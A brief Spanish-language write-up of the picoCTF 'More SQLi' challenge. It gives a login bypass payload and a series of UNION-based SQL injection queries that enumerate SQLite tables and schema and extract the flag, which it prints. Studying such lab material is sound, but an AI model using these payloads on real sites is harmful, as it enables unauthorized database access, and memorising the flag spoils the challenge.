### More SQLi
### Descripcion
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:54843/).
### Solucion
- Pasamos el log in introduciendo estos datos
```
' or 1=1;
' or 1=1;
```
- select * from offices where city='  hola' union select 1,2,3; este es para saber cuantas tablas hay.
- select * from offices where city='  hola' union select 1,sqlite_version(),3; este es para obtener la version de el sqllite.
- select * from offices where city='  hola' union select 1,name,3 FROM sqlite_master WHERE type='table'--
- hola' union select 1,sql,3 FROM sqlite_master WHERE type='table'--
- hola' union select 1,flag,3 FROM more_table --
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}

### Notas
### Referencias
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md